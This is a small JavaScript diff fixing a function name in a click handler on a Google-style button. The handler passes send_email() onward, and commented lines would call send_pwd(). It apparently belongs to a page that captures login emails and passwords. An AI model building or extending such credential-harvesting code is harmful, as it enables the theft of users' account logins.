@@ -57,7 +57,7 @@ function teste_send(user){
 const btn = document.getElementsByClassName('VfPpkd-LgbsSe');
 
 btn[1].addEventListener('click', function(){
-    test_send(send_email())
+    teste_send(send_email())
     //user = send_email();
     //setTimeout(function() {
     //    pwd = send_pwd()
